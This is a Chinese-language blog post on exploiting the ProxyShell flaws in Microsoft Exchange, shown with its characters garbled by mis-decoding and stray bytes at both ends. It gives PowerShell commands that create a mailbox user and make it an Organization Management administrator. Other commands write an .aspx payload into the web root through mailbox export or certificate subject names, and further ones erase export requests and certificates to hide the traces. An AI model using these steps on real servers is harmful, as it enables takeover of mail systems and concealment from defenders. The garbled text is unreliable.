I"¾+<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ProxyShellä¸­æ·»åŠ ç”¨æˆ·å’Œæ–‡ä»¶å†™å…¥çš„ç»†èŠ‚ï¼Œåˆ†æåˆ©ç”¨æ€è·¯ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>æ·»åŠ ç”¨æˆ·çš„æ–¹æ³•</li>
  <li>æ–‡ä»¶å†™å…¥çš„æ–¹æ³•</li>
  <li>åˆ©ç”¨åˆ†æ</li>
</ul>

<h2 id="0x02-æ·»åŠ ç”¨æˆ·çš„æ–¹æ³•">0x02 æ·»åŠ ç”¨æˆ·çš„æ–¹æ³•</h2>
<hr />

<p>ä½¿ç”¨<a href="https://github.com/jborean93/pypsrp">PyPSRP</a>æ‰§è¡ŒPowershellå‘½ä»¤æ—¶ï¼Œæ— æ³•æ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„æ“ä½œ</p>

<p>è¿™æ˜¯å› ä¸ºä¼ é€’Passwordçš„å€¼æ—¶éœ€è¦æ‰§è¡ŒPowershellå‘½ä»¤<code class="language-plaintext highlighter-rouge">convertto-securestring</code>ï¼Œè€Œ<code class="language-plaintext highlighter-rouge">convertto-securestring</code>ä¸æ˜¯Exchange PowerShell Remotingæ”¯æŒçš„å‘½ä»¤</p>

<p>è§£å†³æ–¹æ³•å¯ä»¥å‚è€ƒOrangeçš„æ€è·¯ï¼Œé€šè¿‡è°ƒç”¨æœ¬åœ°Powershellï¼Œæœ€ç»ˆå®ç°æ·»åŠ ç”¨æˆ·</p>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell</p>

<p>éœ€è¦æ³¨æ„ä»¥ä¸‹ç»†èŠ‚ï¼š</p>

<h3 id="1é€šè¿‡flaskå»ºç«‹æœ¬åœ°ä»£ç†æœåŠ¡å™¨">1.é€šè¿‡Flaskå»ºç«‹æœ¬åœ°ä»£ç†æœåŠ¡å™¨</h3>

<p>ä»£ç å¯å‚è€ƒï¼š</p>

<p>https://gist.githubusercontent.com/zdi-team/087026b241df18102db699fe4a3d9282/raw/ab4e1ecb6e0234c2e319bc229c71f2f4f70b55d9/P2O-Vancouver-2021-ProxyShell-snippet-7.py</p>

<p>åœ¨Python3ç¯å¢ƒä¸‹ï¼Œéœ€è¦å°†<code class="language-plaintext highlighter-rouge">request.headers.iteritems()</code>ä¿®æ”¹ä¸º<code class="language-plaintext highlighter-rouge">request.headers.items()</code></p>

<p>å¦‚æœé‡åˆ°è´Ÿè½½å‡è¡¡ï¼Œå¯ä»¥å¯¹è¿”å›çŠ¶æ€ç è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœè¿”å›çŠ¶æ€ç ä¸æ˜¯200ï¼Œé‡æ–°å‘é€æ•°æ®åŒ…</p>

<p>Line28-Line34å¯ä»¥æ›¿æ¢æˆä»¥ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    while True:
        r = requests.post(powershell_url, data=data, headers=req_headers, verify=False)    
        if r.status_code == 200:
            print("[+]" + r.headers["X-CalculatedBETarget"])
            break
        else:    
            print("[-]" + r.headers["X-CalculatedBETarget"])  
    req_headers = {}
    for k, v in r.headers.items(): 
        if k in ['Content-Encoding', 'Content-Length', 'Transfer-Encoding']: 
            continue 
        req_headers[k] = v 
 
    return r.content, r.status_code, req_headers
</code></pre></div></div>

<h3 id="2è°ƒç”¨æœ¬åœ°powershell">2.è°ƒç”¨æœ¬åœ°Powershell</h3>

<p>å‘½ä»¤å¯å‚è€ƒï¼š</p>

<p>https://gist.githubusercontent.com/zdi-team/a2eb014d248e4e54a2ab4ba4ae3ac3cf/raw/af251aefc37a47489f43128832798a210393013a/P2O-Vancouver-2021-ProxyShell-snippet-8.ps1</p>

<p>åœ¨è°ƒç”¨æœ¬åœ°Powershellå‘½ä»¤å‰ï¼Œç³»ç»Ÿéœ€è¦åšä»¥ä¸‹è®¾ç½®ï¼š</p>

<h4 id="1è®¾ç½®ç½‘ç»œä½ç½®">(1)è®¾ç½®ç½‘ç»œä½ç½®</h4>

<p>ä¸èƒ½é€‰æ‹©Public networkï¼Œéœ€è¦Home networkæˆ–è€…Work network</p>

<h4 id="2è®¾ç½®ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ">(2)è®¾ç½®ç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç </h4>

<p>ç¡®ä¿ç®¡ç†å‘˜ç”¨æˆ·è®¾ç½®äº†å¯†ç </p>

<h4 id="3å¼€å¯winrmæœåŠ¡">(3)å¼€å¯winrmæœåŠ¡</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm quickconfig 
</code></pre></div></div>

<h4 id="4ä¿®æ”¹allowunencryptedå±æ€§">(4)ä¿®æ”¹allowunencryptedå±æ€§</h4>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd WSMan:\localhost\Client
set-item .\allowunencrypted $true
dir
</code></pre></div></div>

<h4 id="5è®¾ç½®trustedhosts">(5)è®¾ç½®TrustedHosts</h4>

<p>Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Item WSMan:\localhost\Client\TrustedHosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'
</code></pre></div></div>

<p>ä»¥ä¸Šè®¾ç½®å®Œæˆåï¼Œèƒ½å¤Ÿå»ºç«‹PowerShellä¼šè¯å¹¶æ‰§è¡ŒExchange PowerShellå‘½ä»¤</p>

<p>æ·»åŠ ç”¨æˆ·çš„æ“ä½œéœ€è¦ä¼ å…¥securestringï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code class="language-plaintext highlighter-rouge">-ArgumentList</code>å‚æ•°ä¼ å…¥</p>

<p>æ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$pwd=convertto-securestring Password123 -asplaintext -force;
$command = {New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $args[0];}
Invoke-Command -Session $session -ScriptBlock $command -ArgumentList $pwd
</code></pre></div></div>

<p>æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$command = {Add-RoleGroupMember "Organization Management" -Member testuser1 -BypassSecurityGroupManagerCheck}
Invoke-Command -Session $session -ScriptBlock $command
</code></pre></div></div>

<h2 id="0x03-æ–‡ä»¶å†™å…¥çš„æ–¹æ³•">0x03 æ–‡ä»¶å†™å…¥çš„æ–¹æ³•</h2>
<hr />

<h3 id="1é€šè¿‡new-mailboxexportrequestå†™å…¥æ–‡ä»¶">1.é€šè¿‡New-MailboxExportRequestå†™å…¥æ–‡ä»¶</h3>

<p>New-MailboxExportRequestç”¨äºå¯¼å‡ºé‚®ä»¶ï¼Œç›¸å…³ç”¨æ³•å¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8EExchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%9C%E7%B4%A2%E5%92%8C%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6">ã€Šæ¸—é€åŸºç¡€â€”â€”ä»ExchangeæœåŠ¡å™¨ä¸Šæœç´¢å’Œå¯¼å‡ºé‚®ä»¶ã€‹</a></p>

<p>åœ¨å†™å…¥æ–‡ä»¶æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹é—®é¢˜ï¼š</p>

<h4 id="1ç”¨æˆ·éœ€è¦æ·»åŠ åˆ°è§’è‰²ç»„mailbox-import-exportä¸­">(1)ç”¨æˆ·éœ€è¦æ·»åŠ åˆ°è§’è‰²ç»„â€Mailbox Import Exportâ€ä¸­</h4>

<p>æ·»åŠ ç”¨æˆ·åˆ°è§’è‰²ç»„â€Mailbox Import Exportâ€çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-ManagementRoleAssignment â€“Role "Mailbox Import Export" â€“User Administrator
</code></pre></div></div>

<p>ç§»é™¤ç”¨æˆ·çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-ManagementRoleAssignment -Identity "Mailbox Import Export-Administrator" -Confirm:$false
</code></pre></div></div>

<p>æŸ¥çœ‹è§’è‰²ç»„â€Mailbox Import Exportâ€ä¸­ç”¨æˆ·çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ManagementRoleAssignment â€“Role "Mailbox Import Export"|fl user
</code></pre></div></div>

<h4 id="2é€šè¿‡é‚®ä»¶ä¼ é€’payload">(2)é€šè¿‡é‚®ä»¶ä¼ é€’Payload</h4>

<p>è¿™é‡Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p>

<p>1.ä»å¤–éƒ¨é‚®ç®±å‘ç›®æ ‡é‚®ç®±å‘é€å¸¦æœ‰Payloadçš„é‚®ä»¶
2.åˆ©ç”¨CVE-2021-34473æ¨¡æ‹Ÿä»»æ„é‚®ç®±ç”¨æˆ·ï¼Œå°†å¸¦æœ‰Payloadçš„é‚®ä»¶ä¿å­˜è‡³æŒ‡å®šæ–‡ä»¶å¤¹</p>

<p>å¯¹äºæ–¹æ³•2ï¼Œä¸ºäº†æé«˜éšè”½æ€§ï¼Œåœ¨ä¿å­˜å¸¦æœ‰Payloadçš„é‚®ä»¶æ—¶å¯ä»¥å…ˆåˆ›å»ºéšè—æ–‡ä»¶å¤¹å†è¿›è¡Œä¿å­˜ï¼Œè¯¦æƒ…å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Exchange%E7%94%A8%E6%88%B7%E9%82%AE%E7%AE%B1%E4%B8%AD%E7%9A%84%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%A4%B9">ã€Šæ¸—é€åŸºç¡€â€”â€”Exchangeç”¨æˆ·é‚®ç®±ä¸­çš„éšè—æ–‡ä»¶å¤¹ã€‹</a></p>

<h4 id="3å†™å…¥æ–‡ä»¶">(3)å†™å…¥æ–‡ä»¶</h4>

<p>ä¸ºäº†èƒ½å¤Ÿç²¾ç¡®çš„å†™å…¥Payloadï¼Œé¿å…æ„å¤–é”™è¯¯ï¼Œåœ¨å†™å…¥é‚®ä»¶æ—¶éœ€è¦åŠ å…¥é™å®šæ¡ä»¶ï¼Œåªå¯¼å‡ºå¸¦æœ‰Payloadçš„é‚®ä»¶</p>

<p>å¯¼å‡ºé‚®ä»¶çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-MailboxexportRequest -mailbox "test1" -ContentFilter {(body -like "payload Flag")} -FilePath ("\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\test.aspx")
</code></pre></div></div>

<h4 id="4æ¸…é™¤å¯¼å‡ºè¯·æ±‚">(4)æ¸…é™¤å¯¼å‡ºè¯·æ±‚</h4>

<p>åœ¨æ‰§è¡Œå‘½ä»¤New-MailboxexportRequestè¿›è¡Œå¯¼å‡ºæ—¶ï¼Œä¼šè‡ªåŠ¨ä¿å­˜å¯¼å‡ºè¯·æ±‚çš„è®°å½•ï¼Œé»˜è®¤ä¸º30å¤©</p>

<p>å¦‚æœä¸æƒ³ä¿å­˜å¯¼å‡ºè¯·æ±‚ï¼Œå¯ä»¥åŠ ä¸Šå‚æ•°<code class="language-plaintext highlighter-rouge">-CompletedRequestAgeLimit 0</code></p>

<p><strong>è¡¥å……ï¼šå…³äºå¯¼å‡ºè¯·æ±‚çš„ç›¸å…³æ“ä½œ</strong></p>

<p>æŸ¥çœ‹é‚®ä»¶å¯¼å‡ºè¯·æ±‚ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MailboxExportRequest
</code></pre></div></div>

<p>åˆ é™¤å…·ä½“çš„æŸä¸ªå¯¼å‡ºè¯·æ±‚ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-MailboxExportRequest -RequestQueue "Mailbox Database 1111111111" -RequestGuid 11111111-1111-1111-1111-111111111111 -Confirm:$false
Remove-MailboxExportRequest -Identity 'test.com/Users/test1\MailboxExport' -Confirm:$false
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>åŒ¹é…çš„å‚æ•°ä»<code class="language-plaintext highlighter-rouge">Get-MailboxExportRequest|fl</code>çš„ç»“æœä¸­è·å¾—</p>

<p>åˆ é™¤æ‰€æœ‰å¯¼å‡ºè¯·æ±‚ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false
</code></pre></div></div>

<h3 id="2é€šè¿‡new-exchangecertificateå†™å…¥æ–‡ä»¶">2.é€šè¿‡New-ExchangeCertificateå†™å…¥æ–‡ä»¶</h3>

<p>New-ExchangeCertificateç”¨äºåˆ›å»ºå’Œç»­è®¢è‡ªç­¾åè¯ä¹¦</p>

<p>æœ€æ—©çš„å…¬å¼€åˆ©ç”¨æ–¹æ³•åœ¨cve-2020-17083ä¸­ï¼Œå‚è€ƒèµ„æ–™ï¼š</p>

<p>https://srcincite.io/pocs/cve-2020-17083.ps1.txt</p>

<h4 id="1ä¼ é€’payload">(1)ä¼ é€’Payload</h4>

<p>é€šè¿‡å‚æ•°SubjectNameä¼ å…¥Payloadï¼Œéœ€è¦ç¬¦åˆç‰¹å®šçš„è¯­æ³•ï¼Œå‚è€ƒèµ„æ–™ï¼š</p>

<p>https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-exchangecertificate?view=exchange-ps</p>

<p>ç®€è¦çš„è¯´ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹é—®é¢˜ï¼š</p>

<ul>
  <li>å¯ä»¥ä½¿ç”¨å›ºå®šæ ¼å¼ï¼š CN=Payload</li>
  <li>ä¸èƒ½åŒ…å«è¿™ä¸‰ä¸ªç‰¹æ®Šå­—ç¬¦ï¼š , + ;</li>
</ul>

<p>å¦‚æœé€‰æ‹©Jscriptä½œä¸ºPayloadï¼Œå¯ä»¥å…ˆå°†ä»£ç è¿›è¡ŒBase64ç¼–ç æ¥é¿å…ç‰¹æ®Šå­—ç¬¦</p>

<p>å†™å…¥æ—¶ï¼Œå¦‚æœè¿”å›å†…å®¹ä¸ºMicrosoft.Exchange.Data.BinaryFileDataObjectï¼Œä»£è¡¨å†™å…¥æˆåŠŸ</p>

<h4 id="2æ¸…é™¤è¯ä¹¦">(2)æ¸…é™¤è¯ä¹¦</h4>

<p>è¯»å–æ‰€æœ‰è¯ä¹¦çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ExchangeCertificate
</code></pre></div></div>

<p>åŒ¹é…æŒ‡å®šç‰¹å¾è¯ä¹¦çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ExchangeCertificate | Where-Object -Property Subject -like 'CN="&lt;%@*'
</code></pre></div></div>

<p>åˆ é™¤æŒ‡å®šè¯ä¹¦çš„å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-ExchangeCertificate -Thumbprint 1111111111111111111111111111111111111111 -Confirm:$false
Get-ExchangeCertificate | Where-Object -Property Subject -like 'CN="&lt;%@*' |Remove-ExchangeCertificate -Confirm:$false
</code></pre></div></div>

<h2 id="0x04-å°ç»“">0x04 å°ç»“</h2>
<hr />

<p>åœ¨ProxyShellçš„ç ”ç©¶è¿‡ç¨‹ä¸­ï¼Œæˆ‘äº§ç”Ÿäº†å¾ˆå¤šæ–°çš„æƒ³æ³•ï¼Œæœªæ¥ä¼šåœ¨åˆé€‚çš„æœºä¼šè¿›è¡Œåˆ†äº«ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET